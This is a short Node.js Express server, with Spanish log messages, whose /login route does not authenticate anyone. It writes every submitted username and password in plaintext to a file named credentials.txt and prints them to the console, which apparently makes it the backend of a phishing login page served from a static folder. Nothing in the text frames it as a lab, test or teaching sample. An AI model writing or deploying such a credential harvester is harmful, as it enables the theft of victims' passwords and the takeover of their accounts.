const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile('credentials.txt', logEntry, (err) => {
    if (err) {
      console.error('Error al guardar las credenciales:', err);
      res.status(500).send('Error en el servidor');
      return;
    }
    console.log('Credenciales guardadas:', logEntry);
    res.send('Intento de login registrado');
  });
});

app.listen(port, () => {
  console.log(`Servidor en ejecución en http://localhost:${port}`);
});